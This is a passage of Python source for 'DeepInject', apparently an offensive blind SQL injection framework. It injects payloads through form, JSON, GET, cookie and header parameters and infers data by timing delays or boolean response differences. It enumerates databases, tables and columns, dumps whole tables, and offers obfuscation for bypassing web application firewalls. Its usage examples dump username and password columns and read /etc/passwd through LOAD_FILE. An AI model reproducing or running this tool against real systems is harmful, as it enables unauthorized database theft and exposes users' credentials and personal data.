            body = copy.deepcopy(cfg.multipart_fields)
            body[cfg.inject_param] = payload_value
            return self.session.post(cfg.url, json=body, **kw)

        if cfg.inject_type == "get":
            params = dict(cfg.multipart_fields)
            params[cfg.inject_param] = payload_value
            return self.session.get(cfg.url, params=params, **kw)

        if cfg.inject_type == "cookie":
            kw2 = dict(kw)
            kw2["cookies"] = dict(cfg.cookies)
            kw2["cookies"][cfg.inject_param] = payload_value
            return self.session.get(cfg.url, **kw2)

        if cfg.inject_type == "header":
            kw2 = dict(kw)
            kw2["headers"] = dict(cfg.headers)
            kw2["headers"][cfg.inject_param] = payload_value
            return self.session.get(cfg.url, **kw2)

        raise ValueError(f"Unknown injection type: {cfg.inject_type}")

    def _send(self, payload_value: str) -> float:
        """Send one payload, return elapsed seconds. Retries on transport error."""
        cfg = self.cfg
        last_exc: Optional[Exception] = None
        self._last_fp = None
        t0 = time.monotonic()
        attempts = max(1, cfg.max_retries_soft if cfg.max_retries_soft else cfg.retries)
        for attempt in range(attempts):
            self._throttle()
            t0 = time.monotonic()
            try:
                resp = self._request_once(payload_value)
                elapsed = time.monotonic() - t0
                self._last_fp = ResponseFingerprint.capture(resp)
                self.stats.record(elapsed, len(resp.content or b""), resp.status_code,
                                  retry=attempt > 0)
                if cfg.verbose:
                    print(f"    [HTTP {resp.status_code} {len(resp.content or b'')}B {elapsed:.2f}s]", flush=True)
                return elapsed
            except requests.exceptions.Timeout:
                elapsed = time.monotonic() - t0
                self._last_fp = None
                self.stats.record(elapsed, 0, None, timeout=True, retry=attempt > 0)
                return elapsed + cfg.sleep_sec
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError) as e:
                last_exc = e
                elapsed = time.monotonic() - t0
                self.stats.record(elapsed, 0, None, error=True, retry=attempt > 0)
                if attempt < attempts - 1:
                    time.sleep(min(2.0 * (attempt + 1), 5.0))
                    continue
        print(f"\n[!] Connection error: {last_exc}", file=sys.stderr)
        self._last_fp = None
        return 0.0

    def fetch_fingerprint(self, payload_value: str, samples: int = 1) -> Optional[ResponseFingerprint]:
        """Retrieve the response fingerprint for a payload (used by boolean mode)."""
        fp: Optional[ResponseFingerprint] = None
        for _ in range(max(1, samples)):
            self._send(payload_value)
            fp = self._last_fp
        return fp

    # ── Condition cache ──────────────────────────────────────

    def _cache_key(self, condition: str) -> str:
        return f"{self.cfg.dbms}:{self.cfg.technique}:{self.cfg.payload_style}:{condition}"

    # ── Time-based inference ─────────────────────────────────

    def is_delayed(self, payload: str) -> bool:
        for attempt in range(max(1, self.cfg.retries)):
            elapsed = self._send(payload)
            if self.cfg.verbose:
                print(f"  [t={elapsed:.2f}s attempt={attempt+1}]", end=" ", flush=True)
            if elapsed >= self.cfg.threshold:
                return True
            if attempt < self.cfg.retries - 1:
                time.sleep(0.25)
        return False

    def time_inject(self, condition: str) -> bool:
        cmd = PayloadFactory.build(self.cfg.dbms, self.cfg.payload_style,
                                   condition, self.cfg.sleep_sec)
        if self.cfg.obfuscation_level > 0:
            cmd = Obfuscator.apply(cmd, self.cfg.obfuscation_level)
        return self.is_delayed(cmd)

    # ── Boolean-based inference ──────────────────────────────

    def calibrate_boolean(self, samples: int = 3) -> Tuple[bool, int]:
        """Measure TRUE vs FALSE response fingerprints for boolean-blind inference.

        The FALSE template is the already-negated form of the TRUE template and
        both receive the *same* condition, so the pair must be calibrated with
        one constant condition — not with ``1=1`` on one side and ``1=2`` on the
        other, which would make a ``1 AND NOT (...)`` pair produce two TRUE pages.
        """
        true_tpl, false_tpl = self.cfg.bool_template
        true_payload = true_tpl.format(c="1=1")
        false_payload = false_tpl.format(c="1=1")

        print(f"  [~] Boolean calibration ({samples} samples/side)...", end="", flush=True)
        f_true = self.fetch_fingerprint(true_payload, samples)
        f_false = self.fetch_fingerprint(false_payload, samples)
        if f_true is None or f_false is None:
            print(" no response")
            return False, 0

        score = f_true.diff_score(f_false)
        if score == 0:
            print(" identical responses (score=0) — boolean inference unusable")
            return False, 0

        self.true_ref, self.false_ref = f_true, f_false
        # Tolerance: a third of the observed gap, so small dynamic content
        # (timestamps, CSRF tokens) cannot flip the decision.
        self.bool_tolerance = max(self.cfg.bool_tolerance, score // 3)
        print(f" diff score={score} tolerance={self.bool_tolerance} "
              f"(len {f_true.length} vs {f_false.length})")
        return True, score

    def _require_calibration(self):
        """Ensure boolean references exist; bootstrap calibration on first use.

        A caller that constructs the engine directly (library use, tests) should
        not have to remember to calibrate before the first condition.
        """
        if self.true_ref is None or self.false_ref is None:
            ok, _ = self.calibrate_boolean()
            if not ok:
                raise RuntimeError(
                    "boolean-based inference unusable: TRUE and FALSE responses are "
                    "indistinguishable. Run with --technique time or pass --bool-template."
                )

    def bool_inject(self, condition: str) -> bool:
        """Decide a condition from the TRUE-form response alone.

        The TRUE template embeds the condition in its natural polarity, so
        ``SELECT ... WHERE 1 AND (<condition>)`` returns the page the application
        renders when the predicate holds. Comparing that fingerprint against the
        two calibrated references is enough — no second request is needed.
        """
        self._require_calibration()
        true_tpl, _ = self.cfg.bool_template
        fp = self.fetch_fingerprint(true_tpl.format(c=condition),
                                   samples=max(1, self.cfg.retries))
        if fp is None:
            return False
        d_true = fp.diff_score(self.true_ref)
        d_false = fp.diff_score(self.false_ref)
        if d_true <= self.bool_tolerance:
            return True
        if d_false <= self.bool_tolerance:
            return False
        # Both references are far away (WAF page, rate limit, dynamic content):
        # fall back to whichever is closer instead of silently guessing FALSE.
        return d_true < d_false

    # ── Unified interface ────────────────────────────────────

    def inject_condition(self, condition: str, record: bool = True) -> bool:
        """Evaluate a boolean SQL condition with the active technique."""
        if self.cfg.technique == TECH_BOOL:
            return self.bool_inject(condition)
        return self.time_inject(condition)

    def inject_condition_memo(self, condition: str) -> bool:
        key = self._cache_key(condition)
        with self.mem_lock:
            if key in self.memory:
                return self.memory[key]
        if self.state is not None:
            hit = self.state.get("cond", key)
            if hit is not None:
                with self.mem_lock:
                    self.memory[key] = bool(hit)
                return bool(hit)
        value = self.inject_condition(condition)
        with self.mem_lock:
            self.memory[key] = value
        if self.state is not None:
            self.state.set(value, "cond", key)
        return value

    # ── Discovery ────────────────────────────────────────────

    def auto_detect(self) -> bool:
        """Find the first payload style that produces a measurable delay."""
        styles = PayloadFactory.styles_for(self.cfg.dbms)
        if self.cfg.payload_style in styles:
            styles = [self.cfg.payload_style] + [s for s in styles if s != self.cfg.payload_style]
        for style in styles:
            label = PayloadFactory.STYLE_NAMES[style] if style < len(PayloadFactory.STYLE_NAMES) else f"STYLE-{style}"
            probe = PayloadFactory.true_probe(self.cfg.dbms, style, self.cfg.sleep_sec)
            print(f"  [{style}] {label:12} ... ", end="", flush=True)
            if self.cfg.obfuscation_level > 0:
                probe = Obfuscator.apply(probe, self.cfg.obfuscation_level)
            if self.is_delayed(probe):
                print("DELAY DETECTED!")
                self.cfg.payload_style = style
                return True
            print("no delay")
        # Fallback: some targets only answer stacked/terminated queries.
        probe = f"1;SELECT {DBMS.SLEEP.get(self.cfg.dbms, 'SLEEP({n})').format(n=self.cfg.sleep_sec)}-- -"
        print(f"  [*] STACKED      ... ", end="", flush=True)
        if self.is_delayed(probe):
            print("DELAY DETECTED!")
            return True
        print("no delay")
        return False

    def verify(self) -> bool:
        """Quick vulnerability check with the active technique."""
        if self.cfg.technique == TECH_BOOL:
            ok, _ = self.calibrate_boolean()
            return ok
        for style in PayloadFactory.styles_for(self.cfg.dbms)[:6]:
            label = PayloadFactory.STYLE_NAMES[style] if style < len(PayloadFactory.STYLE_NAMES) else f"STYLE-{style}"
            probe = PayloadFactory.true_probe(self.cfg.dbms, style, self.cfg.sleep_sec)
            elapsed = self._send(probe)
            if self.cfg.verbose:
                print(f"  [probe:{label} t={elapsed:.2f}s] {probe[:70]}...")
            if elapsed >= self.cfg.threshold:
                self.cfg.payload_style = style
                return True
        return False

    def calibrate(self, samples: int = 3) -> float:
        print(f"  [~] Calibrating baseline ({samples} req)...", end="", flush=True)
        times = []
        for _ in range(samples):
            t = self._send("1")
            times.append(t)
            print(f" {t:.2f}s", end="", flush=True)
        times.sort()
        baseline = times[len(times) // 2]
        print(f"\n  [~] Baseline median: {baseline:.2f}s")
        suggested = max(baseline * 3, baseline + 2.0)
        if suggested > self.cfg.threshold:
            print(f"  [!] Suggested threshold: {suggested:.1f}s (current: {self.cfg.threshold}s)")
        return baseline


# ─────────────────────────────────────────────────────────────
#  DATA EXTRACTOR — Binary Search + Checkpoint Resume
# ─────────────────────────────────────────────────────────────

class DataExtractor:
    """Binary-search extraction over boolean conditions.

    Repeats of already-answered conditions are memoized (per run in memory,
    across runs through the --state file), which is what makes resume and
    parallel character extraction cheap.
    """

    def __init__(self, engine: InjectionEngine):
        self.engine = engine
        self.cfg = engine.cfg
        self.stats = engine.stats
        self.state = engine.state
        self._lock = threading.Lock()
        self._done = 0

    # ── Instrumented primitive ───────────────────────────────

    def _cond(self, condition: str) -> bool:
        key = f"cond:{condition}" if self.state else None
        if key and self.state:
            hit = self.state.get("expr", key)
            if hit is not None:
                return bool(hit)
        value = self.engine.inject_condition_memo(condition)
        if key and self.state:
            self.state.set(value, "expr", key)
        return value

    def _est_remaining_line(self, done: int, total_steps: int, label: str = ""):
        """Print a live 'x/y steps · eta' style progress fragment."""
        rate = self.stats.rate()
        elapsed = self.stats.wall_time
        if done > 0 and rate > 0 and total_steps > done:
            eta = (total_steps - done) / rate
            frag = f" · {done}/{total_steps} steps · ETA {fmt_duration(eta)}"
        elif done > 0:
            frag = f" · {done}/{total_steps} steps · {fmt_duration(elapsed)}"
        else:
            frag = ""
        if label:
            frag = f"{label}{frag}"
        return frag

    # ── Length / count / char primitives ─────────────────────

    def get_count(self, count_query: str, hi: int = 100000) -> int:
        lo = 0
        if not self._cond(f"({count_query})>0"):
            return 0
        while lo < hi:
            mid = (lo + hi) // 2
            if self._cond(f"({count_query})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def length_expr(self, str_query: str) -> str:
        """DBMS-correct length expression for a scalar subquery."""
        db = self.cfg.dbms
        if db == DBMS.MSSQL:
            return f"LEN(({str_query}))"
        if db == DBMS.ORACLE:
            return f"LENGTH(({str_query}))"
        return f"LENGTH(({str_query}))"

    def char_expr(self, str_query: str, pos: int) -> str:
        """DBMS-correct ASCII-of-position expression.

        The upstream version always emitted LENGTH/SUBSTRING/ASCII, which is not
        valid on MSSQL (SUBSTRING needs a length and ASCII is unknown) nor fully
        portable to Oracle, so non-MySQL targets failed to extract anything.
        """
        db = self.cfg.dbms
        if db == DBMS.MSSQL:
            return f"ASCII(SUBSTRING(({str_query}),{pos},1))"
        if db == DBMS.PGSQL:
            return f"ASCII(SUBSTRING(({str_query}) FROM {pos} FOR 1))"
        if db == DBMS.ORACLE:
            return f"ASCII(SUBSTR(({str_query}),{pos},1))"
        return f"ASCII(SUBSTRING(({str_query}),{pos},1))"

    def get_length(self, str_query: str) -> int:
        key = f"len:{self.cfg.dbms}:{str_query}"
        if self.state:
            hit = self.state.get("extract", key)
            if hit is not None:
                return int(hit)
        lo, hi = 0, self.cfg.max_len
        if not self._cond(f"{self.length_expr(str_query)}>0"):
            length = 0
        else:
            while lo < hi:
                mid = (lo + hi) // 2
                if self._cond(f"{self.length_expr(str_query)}>{mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            length = lo
        if self.state:
            self.state.set(length, "extract", key)
        return length

    def get_char(self, str_query: str, pos: int, lo: int = 32, hi: int = 127) -> str:
        while lo < hi:
            mid = (lo + hi) // 2
            if self._cond(f"{self.char_expr(str_query, pos)}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else "?"

    def get_char_cached(self, str_query: str, pos: int) -> str:
        key = f"char:{self.cfg.dbms}:{str_query}:{pos}"
        if self.state:
            hit = self.state.get("extract", key)
            if hit is not None:
                return str(hit)
        ch = self.get_char(str_query, pos)
        if self.state:
            self.state.set(ch, "extract", key)
        return ch

    # ── Extraction ───────────────────────────────────────────

    def extract(self, str_query: str, show: bool = True) -> str:
        key = f"str:{self.cfg.dbms}:{str_query}"
        if self.state:
            hit = self.state.get("extract", key)
            if hit is not None:
                if show:
                    print(str(hit), end="", flush=True)
                return str(hit)

        length = self.get_length(str_query)
        if length == 0:
            if self.state:
                self.state.set("", "extract", key)
            return ""

        if self.cfg.threads > 1:
            chars: List[Optional[str]] = [None] * length
            with ThreadPoolExecutor(max_workers=self.cfg.threads) as ex:
                futures = {ex.submit(self.get_char_cached, str_query, i + 1): i for i in range(length)}
                for fut in as_completed(futures):
                    idx = futures[fut]
                    try:
                        chars[idx] = fut.result()
                    except Exception:
                        chars[idx] = "?"
            result = "".join(c if c is not None else "?" for c in chars)
            if show:
                print(result, end="", flush=True)
        else:
            result = ""
            for i in range(1, length + 1):
                ch = self.get_char_cached(str_query, i)
                result += ch
                if show:
                    print(ch, end="", flush=True)

        if self.state:
            self.state.set(result, "extract", key)
        return result

    def extract_rows(self, query_template: str, columns: List[str], total: int,
                     show: bool = True, **fmt) -> List[Dict[str, str]]:
        """Extract `total` rows of the given columns, checkpointing row by row.

        ``**fmt`` supplies the remaining placeholders in the row template
        (``db``/``tbl``), which differ per DBMS.
        """
        rows: List[Dict[str, str]] = []
        for idx in range(total):
            row_key = f"row:{self.cfg.dbms}:{query_template}:{fmt}:{idx}"
            cached = self.state.get("rows", row_key) if self.state else None
            if cached is not None:
                print(f"  [{idx+1}/{total}] (resumed from state)")
                rows.append(dict(cached))
                continue
            row: Dict[str, str] = {}
            for col in columns:
                q = query_template.format(col=col, idx=idx, idx1=idx + 1, **fmt)
                if show:
                    print(f"  [{idx+1}/{total}] {col:20}: ", end="", flush=True)
                row[col] = self.extract(q, show=show)
                if show:
                    print()
            rows.append(row)
            if self.state:
                self.state.set(row, "rows", row_key)
        return rows


# ─────────────────────────────────────────────────────────────
#  ENUMERATOR
# ─────────────────────────────────────────────────────────────

class Enumerator:

    def __init__(self, extractor: DataExtractor, label: str = ""):
        self.ex = extractor
        self.cfg = extractor.cfg
        self.db = self.cfg.dbms
        self.label = label

    def _q(self, tmpl_dict: Dict, **kw) -> Optional[str]:
        """Look up a query template and optionally expand the given placeholders.

        Callers pass only the values they know: ``_names`` expands a name query
        per row (idx/idx1) itself, and count queries only need ``db``/``tbl``.
        Unsupplied placeholders therefore leave the template untouched instead
        of raising KeyError.
        """
        tmpl = tmpl_dict.get(self.db)
        if not tmpl:
            print(f"\n[!] Query tidak tersedia untuk DBMS '{self.db}'")
            return None
        if not kw:
            return tmpl
        try:
            return tmpl.format(**kw)
        except (KeyError, IndexError):
            return tmpl

    def _extract(self, label: str, q: str) -> str:
        print(f"  {label}: ", end="", flush=True)
        v = self.ex.extract(q)
        print()
        return v

    # ── Fingerprint ──────────────────────────────────────────

    def get_version(self) -> str:
        q = DBMS.VERSION.get(self.db, "SELECT VERSION()")
        return self._extract("Version", q)

    def get_current_db(self) -> str:
        q = DBMS.CURRENT_DB.get(self.db, "SELECT DATABASE()")
        return self._extract("Database", q)

    def get_current_user(self) -> str:
        q = DBMS.CURRENT_USER.get(self.db, "SELECT USER()")
        return self._extract("User", q)

    def get_hostname(self) -> str:
        q = DBMS.HOSTNAME.get(self.db, "SELECT @@HOSTNAME")
        return self._extract("Hostname", q)

    def get_data_dir(self) -> str:
        q = DBMS.DATA_DIR.get(self.db)
        if not q:
            return "N/A"
        return self._extract("DataDir", q)

    def get_privileges(self) -> str:
        q = DBMS.PRIVS.get(self.db)
        if not q:
            return "N/A"
        return self._extract("Privileges", q)

    def fingerprint(self) -> Dict[str, str]:
        print("\n[*] Server Fingerprint")
        print("─" * 50)
        info = {
            "version":    self.get_version(),
            "current_db": self.get_current_db(),
            "user":       self.get_current_user(),
            "hostname":   self.get_hostname(),
            "data_dir":   self.get_data_dir(),
        }
        if self.db == DBMS.MYSQL:
            info["privileges"] = self.get_privileges()
        return info

    def _names(self, kind: str, count_query: str, name_query: str, limit: int = 0, **fmt) -> List[str]:
        """Shared enumerator for databases / tables / columns with progress + state.

        ``name_query`` keeps its placeholders so each row can be expanded with a
        fresh idx, and any DBMS-specific values (db/tbl) are forwarded via ``fmt``.
        """
        count_template = count_query.format(**fmt) if fmt else count_query
        total = self.ex.get_count(count_template)
        if limit:
            total = min(total, limit)
        print(f"  [+] Ditemukan {total} {kind}\n")
        names: List[str] = []
        for idx in range(total):
            q = name_query.format(idx=idx, idx1=idx + 1, **fmt)
            if not q:
                break
            print(f"  [{idx+1:02d}/{total}] ", end="", flush=True)
            name = self.ex.extract(q)
            print()
            if name:
                names.append(name)
        return names

    def enum_databases(self) -> List[str]:
        print("\n[*] Enumerasi Databases")
        print("─" * 50)
        count_q = self._q(DBMS.DB_COUNT)
        name_q = self._q(DBMS.DB_NAME)
        if not count_q or not name_q:
            return []
        return self._names("database", count_q, name_q)

    def enum_tables(self, db: str, limit: int = 0) -> List[str]:
        print(f"\n[*] Enumerasi Tables di '{db}'")
        print("─" * 50)
        count_q = self._q(DBMS.TABLE_COUNT, db=db)
        name_q = self._q(DBMS.TABLE_NAME, db=db)
        if not count_q or not name_q:
            return []
        return self._names("tabel", count_q, name_q, limit=limit, db=db)

    def enum_columns(self, db: str, table: str, limit: int = 0) -> List[str]:
        print(f"\n[*] Enumerasi Columns di '{db}.{table}'")
        print("─" * 50)
        count_q = self._q(DBMS.COL_COUNT, db=db, tbl=table)
        name_q = self._q(DBMS.COL_NAME, db=db, tbl=table)
        if not count_q or not name_q:
            return []
        return self._names("kolom", count_q, name_q, limit=limit, db=db, tbl=table)

    # ── Data Dump ─────────────────────────────────────────────

    def row_count(self, db: str, table: str) -> int:
        q = self._q(DBMS.ROW_COUNT, db=db, tbl=table)
        if not q or "{" in q:
            return 0
        return self.ex.get_count(q)

    def dump_table(self, db: str, table: str, columns: List[str], limit: int = 50) -> List[Dict]:
        print(f"\n[*] Dump '{db}.{table}' [{', '.join(columns)}]")
        print("─" * 50)
        template = self._q(DBMS.DUMP_ROW, db=db, tbl=table)
        if not template:
            return []
        total = min(self.row_count(db, table), limit)
        print(f"  [+] Total baris: {total} (maks dump: {limit})\n")
        return self.ex.extract_rows(template, columns, total, db=db, tbl=table)

    # ── Database / schema size (v2.1) ─────────────────────────

    def table_sizes(self, db: str) -> Dict[str, str]:
        tmpl = DBMS.TABLE_SIZE.get(self.db)
        if not tmpl:
            return {}
        print(f"\n[*] Estimasi ukuran tabel di '{db}'")
        print("─" * 50)
        sizes: Dict[str, str] = {}
        for name in self.enum_tables(db):
            q = tmpl.format(db=db, tbl=name)
            sizes[name] = self._extract(f"{name:24} rows/bytes", q)
        return sizes


# ─────────────────────────────────────────────────────────────
#  REPORTER
# ─────────────────────────────────────────────────────────────
class Reporter:
    """Collects findings and writes them as txt / json / csv / jsonl.

    ``sections`` keeps its flat "key -> value" shape for compatibility, while
    ``wrapper`` marks engine-generated metadata so old consumers of the JSON
    format are unaffected by the new envelope.
    """

    def __init__(self, path: Optional[str], fmt: str = "txt"):
        self.path = path
        self.fmt = fmt
        self.sections: Dict[str, Any] = {}
        self.meta: Dict[str, Any] = {}

    def add(self, key: str, value: Any):
        self.sections[key] = value

    def set_meta(self, meta: Dict[str, Any]):
        self.meta = meta

    def body(self) -> Dict[str, Any]:
        payload = dict(self.sections)
        if self.meta:
            payload["_meta"] = self.meta
        return payload

    def save(self):
        if not self.path:
            return
        try:
            if self.fmt == "json":
                with open(self.path, "w", encoding="utf-8") as f:
                    json.dump(self.body(), f, indent=2, default=str)
            elif self.fmt == "jsonl":
                with open(self.path, "w", encoding="utf-8") as f:
                    if self.meta:
                        f.write(json.dumps({"_meta": self.meta}, default=str) + "\n")
                    for key, value in self.sections.items():
                        if isinstance(value, list):
                            for item in value:
                                f.write(json.dumps({"section": key, "value": item}, default=str) + "\n")
                        else:
                            f.write(json.dumps({"section": key, "value": value}, default=str) + "\n")
            elif self.fmt == "csv":
                with open(self.path, "w", newline="", encoding="utf-8") as f:
                    wrote = False
                    for key, rows in self.sections.items():
                        if isinstance(rows, list) and rows and isinstance(rows[0], dict):
                            w = csv.DictWriter(f, fieldnames=rows[0].keys())
                            w.writeheader()
                            w.writerows(rows)
                            wrote = True
                    if not wrote:
                        w = csv.writer(f)
                        w.writerow(["section", "value"])
                        for key, value in self.sections.items():
                            w.writerow([key, value])
            else:
                with open(self.path, "w", encoding="utf-8") as f:
                    if self.meta:
                        f.write(f"{'='*60}\nRUN METADATA\n{'='*60}\n")
                        for mk, mv in self.meta.items():
                            f.write(f"  {mk}: {mv}\n")
                    for k, v in self.sections.items():
                        f.write(f"\n{'='*60}\n{k}\n{'='*60}\n")
                        if isinstance(v, list):
                            for i, item in enumerate(v, 1):
                                if isinstance(item, dict):
                                    f.write(f"  [{i}] " + " | ".join(f"{dk}={dv}" for dk, dv in item.items()) + "\n")
                                else:
                                    f.write(f"  [{i}] {item}\n")
                        elif isinstance(v, dict):
                            for dk, dv in v.items():
                                f.write(f"  {dk}: {dv}\n")
                        else:
                            f.write(f"  {v}\n")
        except OSError as e:
            print(f"\n[!] Gagal menyimpan hasil: {e}", file=sys.stderr)
            return
        size = os.path.getsize(self.path)
        print(f"\n[+] Hasil disimpan → {self.path} ({size} bytes, fmt={self.fmt})")


# ─────────────────────────────────────────────────────────────
#  DUMP-ALL PIPELINE (v2.1)
# ─────────────────────────────────────────────────────────────

class DumpAll:
    """End-to-end enumeration: databases → tables → columns → rows.

    Designed for unattended runs: every step is checkpointed through
    DataExtractor/CheckpointStore, so a `Ctrl-C` and relaunch with the same
    --state file continues instead of restarting the whole climb.
    """

    def __init__(self, enumerator: "Enumerator", extractor: DataExtractor,
                 reporter: "Reporter", cfg: Config):
        self.enum = enumerator
        self.ex = extractor
        self.reporter = reporter
        self.cfg = cfg
        self.dbms = cfg.dbms

    def _table_names(self, db: str) -> List[str]:
        q = DBMS.DUMP_ALL_TABLES.get(self.dbms) or DBMS.TABLE_NAME.get(self.dbms)
        if not q:
            return []
        count_q = DBMS.TABLE_COUNT.get(self.dbms)
        total = self.ex.get_count(count_q.format(db=db)) if count_q else 0
        names = []
        for idx in range(total):
            print(f"  [{idx+1:02d}/{total}] tabel: ", end="", flush=True)
            name = self.ex.extract(q.format(db=db, idx=idx, idx1=idx + 1))
            print()
            if name:
                names.append(name)
        return names

    def run(self, db: str = "", skip_dbs: Optional[List[str]] = None) -> Dict[str, Any]:
        summary: Dict[str, Any] = {"databases": {}, "tables_dumped": 0, "rows": 0,
                                   "dumped_databases": []}
        skip = {s.lower() for s in (skip_dbs or [])}

        dbs = [db] if db else self.enum.enum_databases()
        summary["databases"]["list"] = dbs
        if not dbs:
            print("\n[!] --dump-all: tidak ada database yang bisa dienumerasi.")
            return summary

        for dbname in dbs:
            # Engine/system schemas are huge and rarely the objective; skipping
            # them by default keeps a full walk from running for hours.
            if dbname.lower() in skip:
                print(f"\n[i] Melewati database sistem '{dbname}' (--exclude-db untuk ubah).")
                continue

            print(f"\n{'═'*60}\n[*] DUMP-ALL → {dbname}\n{'═'*60}")
            db_info: Dict[str, Any] = {}

            tables = self._table_names(dbname)
            print(f"  [+] {len(tables)} tabel: {', '.join(tables) if tables else '-'}")
            db_info["tables"] = tables

            for table in tables:
                cols = self.enum.enum_columns(dbname, table, limit=self.cfg.max_len)
                if not cols:
                    print(f"  [-] {table}: tidak ada kolom, dilewati.")
                    continue
                rows = self.enum.dump_table(dbname, table, cols, limit=self.cfg.dump_limit)
                db_info[table] = {"columns": cols, "rows": rows}
                summary["tables_dumped"] += 1
                summary["rows"] += len(rows)
                self.reporter.add(f"dump_{dbname}_{table}", rows)
                self.reporter.add(f"columns_{dbname}_{table}", cols)
                if self.cfg.state_file and self.ex.state is not None:
                    print(f"  [~] state: {self.ex.state.stats()}")

            summary["databases"][dbname] = db_info
            summary.setdefault("dumped_databases", []).append(dbname)

        self.reporter.add("dump_all_summary", {
            "databases": dbs,
            "dumped_databases": summary.get("dumped_databases", []),
            "tables_dumped": summary["tables_dumped"],
            "rows_extracted": summary["rows"],
        })
        return summary


# ─────────────────────────────────────────────────────────────
#  CLI HELPERS
# ─────────────────────────────────────────────────────────────

def parse_kv(s: str, sep: str = ",") -> Dict[str, str]:
    """'key1=val1,key2=val2' → dict"""
    if not s:
        return {}
    result: Dict[str, str] = {}
    for part in s.split(sep):
        if "=" in part:
            k, _, v = part.partition("=")
            result[k.strip()] = v
        else:
            result[part.strip()] = ""
    return result


def parse_cookies(s: str) -> Dict[str, str]:
    """'k1=v1; k2=v2' → dict"""
    return parse_kv(s.replace(";", ","))


def build_cookie_jar(cookies: Dict[str, str]) -> Dict[str, str]:
    """Normalize a cookie dict, dropping empty values."""
    return {k: v for k, v in cookies.items() if k}


def sanitize_filename(name: str, fallback: str = "deepinject") -> str:
    """Make a DB/table/URL string safe to use as a file name component.

    Leading dots are stripped as well, so a hostile table name such as
    ``../../etc/passwd`` cannot produce a hidden or relative path component.
    """
    safe = re.sub(r"[^A-Za-z0-9._-]+", "_", name).lstrip("._").strip("_")
    return safe[:80] or fallback


def target_slug(url: str) -> str:
    """'https://t.local/upload.php?a=1' → 't.local_upload.php' (file-name safe)."""
    m = re.match(r"^\w+://([^/?#]+)(/[^?#]*)?", url or "")
    if not m:
        return sanitize_filename(url or "target")
    host, path = m.group(1), m.group(2) or ""
    return sanitize_filename(f"{host}{path.replace('/', '_')}")


def ask_yes_no(question: str, default: bool = False, assume_yes: bool = False) -> bool:
    """Prompt that never hangs: non-interactive runs and -y resolve automatically."""
    if assume_yes:
        return True
    if not sys.stdin or not sys.stdin.isatty():
        print(f"  [i] {question} → non-interactive, "
              f"defaulting to {'yes' if default else 'no'} (use -y to assume yes)")
        return default
    try:
        ans = input(f"{question} [{'Y/n' if default else 'y/N'}] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    if not ans:
        return default
    return ans in ("y", "yes")


def install_signal_handler(store: Optional[CheckpointStore], extra=None):
    """Flush checkpoint state on Ctrl-C so the next run can resume."""
    def _handler(signum, _frame):
        print("\n[!] Interrupted — menyimpan progress...")
        if store is not None:
            store.persist()
            print(f"    state tersimpan ({store.stats()}) → {store.path}")
        if extra:
            extra()
        sys.exit(130)
    try:
        signal.signal(signal.SIGINT, _handler)
    except (ValueError, AttributeError):
        pass  # not on the main thread


def default_headers(extra: List[str]) -> Dict[str, str]:
    h = {
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-us,en;q=0.5",
        "Cache-Control":   "no-cache",
    }
    for item in extra:
        if ": " in item:
            k, _, v = item.partition(": ")
            h[k.strip()] = v.strip()
        elif ":" in item:
            k, _, v = item.partition(":")
            h[k.strip()] = v.strip()
    return h


# ─────────────────────────────────────────────────────────────
#  ARGUMENT PARSER
# ─────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="deepinject",
        description=f"DeepInject v{VERSION} — Advanced Blind SQLi Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
─────────────────────────────────────────────────────────
 CONTOH PENGGUNAAN
─────────────────────────────────────────────────────────

  # Multipart/form-data (form dengan file upload)
  # --param    : nama field yang vulnerable
  # --fields   : field lain di form (key=value, pisah koma)
  # --file-fields : field yang bertipe file upload
  python deepinject.py -u https://target.local/page.php \\
    --type multipart --param target_field \\
    --fields "field1=value1,field2=value2" \\
    --file-fields file_field \\
    --cookie "PHPSESSID=your_session_here" \\
    --enum-db

  # POST form biasa (application/x-www-form-urlencoded)
  python deepinject.py -u https://target.local/login.php \\
    --type form --param search \\
    --fields "category=news,page=1" \\
    --obfuscate 2 --payload-style 1 \\
    --enum-tables --db target_db

  # GET parameter
  python deepinject.py -u "https://target.local/item.php" \\
    --type get --param id \\
    --enum-db --fingerprint

  # JSON API body
  python deepinject.py -u https://target.local/api/search \\
    --type json --param keyword \\
    --json-body '{"keyword":"x","limit":10}' \\
    --enum-tables --db target_db

  # Cookie injection
  python deepinject.py -u https://target.local/dashboard \\
    --type cookie --param user_token \\
    --enum-db

  # Header injection (mis. X-Forwarded-For, User-Agent)
  python deepinject.py -u https://target.local/page.php \\
    --type header --param X-Forwarded-For \\
    --enum-db

  # Dump tabel tertentu, output JSON
  python deepinject.py -u https://target.local/page.php \\
    --type multipart --param target_field \\
    --fields "field1=value1" --file-fields file_field \\
    --cookie "PHPSESSID=your_session_here" \\
    --dump --db target_db --table users \\
    --columns "id,username,password,email" \\
    -o hasil_dump.json --fmt json

  # Auto-detect payload style (WAF bypass otomatis)
  python deepinject.py -u https://target.local/page.php \\
    --type multipart --param target_field \\
    --fields "field1=value1" --file-fields file_field \\
    --cookie "PHPSESSID=your_session_here" \\
    --auto-detect

  # Custom query manual
  python deepinject.py -u https://target.local/page.php \\
    --type get --param id \\
    --query "SELECT LOAD_FILE('/etc/passwd')"

  # Auto-pilih teknik (time vs boolean) — v2.1
  python deepinject.py -u https://target.local/page.php \\
    --type get --param id --technique auto --enum-db

  # Boolean-based saja, dengan override pasangan payload
  python deepinject.py -u https://target.local/page.php \\
    --type get --param id --technique bool \\
    --bool-template "1 AND ({c})|1 AND NOT ({c})"

  # Rate limit + checkpoint agar bisa di-resume (v2.1)
  python deepinject.py -u https://target.local/page.php \\
    --type get --param id --delay 0.5 --sleep-jitter 0.3 \\
    --state state.json --dump-all --dump-limit 20 --dump-dir out/

  # Lanjutkan run yang terhenti (Ctrl-C aman)
  python deepinject.py -u https://target.local/page.php \\
    --type get --param id --state state.json --resume --dump-all

